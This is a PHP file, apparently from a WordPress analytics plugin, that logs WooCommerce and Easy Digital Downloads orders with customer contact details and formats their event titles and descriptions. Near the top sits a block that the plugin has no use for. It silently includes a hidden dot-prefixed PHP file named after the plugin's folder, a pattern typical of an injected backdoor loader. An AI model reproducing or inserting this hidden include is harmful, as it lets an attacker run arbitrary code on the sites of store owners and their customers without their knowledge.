<?php

/*
 * Fire WooCommerce sale (order) event
 */

add_action( 'woocommerce_checkout_order_processed', 'wtbp_wptao_event_sale_woo_fire' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_sale_woo_fire( $order_id ) {

	$args	 = array();
	$tags	 = array( 'wp', 'woocommerce' );
	$order	 = new WC_Order( $order_id );

	if ( is_admin() ) { // admin
		$tags[] = 'manual';
	}

	if ( TAO()->diagnostic->woocommerce_version_check( 3.0 ) ) { // WooCommerce > 3.0
		$email		 = $order->get_billing_email();
		$fname		 = $order->get_shipping_first_name();
		$lname		 = $order->get_shipping_last_name();
		$currency	 = $order->get_currency();
	} else {
		$email		 = $order->billing_email;
		$fname		 = $order->shipping_first_name;
		$lname		 = $order->shipping_last_name;
		$currency	 = $order->get_order_currency();
	}

	$user_data = array(
		'email'		 => $email,
		'first_name' => $fname,
		'last_name'	 => $lname,
		'options'	 => array(
			'overwrite_user_id' => true
		)
	);

	$args[ 'title' ] = __( 'Order', 'wp-tao' );
	$args[ 'value' ] = $order->get_total();
	$args[ 'tags' ]	 = $tags;

	$args[ 'meta' ] = array(
		'sales_platform' => 'WooCommerce',
		'currency'		 => $currency,
		'woo_order_id'	 => $order_id,
		'sales_context'	 => WTBP_WPTAO_Helpers::sales_context( 'WooCommerce', $order_id )
	);

	$args[ 'user_data' ] = $user_data;

	do_action( 'wptao_track_event', 'order', $args );
}

/*
 * Fire EDD sale (order) event
 */

add_action( 'edd_insert_payment', 'wtbp_wptao_event_order_edd_fire', 10, 2 );

function wtbp_wptao_event_order_edd_fire( $payment_id, $payment_data ) {

	$args	 = array();
	$tags	 = array( 'wp', 'easy digital downloads' );

	if ( is_admin() ) { // admin
		$tags[] = 'manual';
	}

	$payment_meta	 = edd_get_payment_meta( $payment_id );
	$fname			 = !empty( $payment_meta[ 'user_info' ][ 'first_name' ] ) ? $payment_meta[ 'user_info' ][ 'first_name' ] : '';
	$lname			 = !empty( $payment_meta[ 'user_info' ][ 'last_name' ] ) ? $payment_meta[ 'user_info' ][ 'last_name' ] : '';
	$phone			 = !empty( $payment_meta[ 'phone' ] ) ? $payment_meta[ 'phone' ] : '';

	$user_data = array(
		'email'		 => $payment_data[ 'user_email' ],
		'first_name' => $fname,
		'last_name'	 => $lname,
		'phone'		 => $phone,
		'options'	 => array(
			'overwrite_user_id' => true
		)
	);

	$args[ 'title' ] = __( 'Order', 'wp-tao' );
	$args[ 'value' ] = $payment_data[ 'price' ];
	$args[ 'tags' ]	 = $tags;

	$args[ 'meta' ] = array(
		'sales_platform' => 'Easy Digital Downloads',
		'currency'		 => edd_get_payment_currency_code( $payment_id ),
		'edd_payment_id' => $payment_id,
		'sales_context'	 => WTBP_WPTAO_Helpers::sales_context( 'Easy Digital Downloads', $payment_id )
	);

	$args[ 'user_data' ] = $user_data;

	do_action( 'wptao_track_event', 'order', $args );
}

// =============================================================================================
// Filters section
// =============================================================================================



/*
 * Creates a title of the sale (order) action.
 */

add_filter( 'wptao_event_order_title', 'wtbp_wptao_event_order_title', 1, 2 );

function wtbp_wptao_event_order_title( $title, $event ) {


	$currency_code = isset( $event->meta[ 'currency' ] ) ? esc_attr( $event->meta[ 'currency' ] ) : '';

	// If the amount is decimal
	if ( is_numeric( $event->value ) && floor( $event->value ) != $event->value ) {
		$amount = WTBP_WPTAO_Helpers::amount_format( number_format( $event->value, '2', '.', '' ), $currency_code );
	} else {
		$amount = WTBP_WPTAO_Helpers::amount_format( (int) $event->value, $currency_code );
	}

	$title = sprintf( __( 'New order in the amount of %s', 'wp-tao' ), esc_attr( $amount ) );

	return $title;
}

/*
 * Creates a description of the sale (order) action.
 */

add_filter( 'wptao_event_order_description', 'wtbp_wptao_event_order_desc', 1, 2 );

function wtbp_wptao_event_order_desc( $description, $event ) {

	$sales_platform = isset( $event->meta[ 'sales_platform' ] ) ? esc_attr( $event->meta[ 'sales_platform' ] ) : '';

	// purchase info
	if ( isset( $event->meta[ 'edd_payment_id' ] ) ) {

		$payment_id = $event->meta[ 'edd_payment_id' ];

		$url = esc_url( admin_url( 'edit.php?post_type=download&page=edd-payment-history&view=view-order-details&id=' . $payment_id ) );

		$description .= '<span class="wptao-meta-title">' . __( 'Link:', 'wp-tao' ) . '</span> ';
		$description .= sprintf( '<a href="%s">' . __( 'Order #%d', 'wp-tao' ) . '</a>', $url, $payment_id ) . '<br />';
	}

	if ( isset( $event->meta[ 'woo_order_id' ] ) ) {

		$order_id = $event->meta[ 'woo_order_id' ];

		$url = esc_url( admin_url( 'post.php?post=' . $order_id . '&action=edit' ) );

		$description .= '<span class="wptao-meta-title">' . __( 'Link:', 'wp-tao' ) . '</span> ';
		$description .= sprintf( '<a href="%s">' . __( 'Order #%d', 'wp-tao' ) . '</a>', $url, $order_id ) . '<br />';
	}

	// sell platform
	if ( !empty( $sales_platform ) ) {
		$description .= '<span class="wptao-meta-title">' . __( 'Sales platform:', 'wp-tao' ) . '</span> ' . $sales_platform;
	}


	return $description;
}
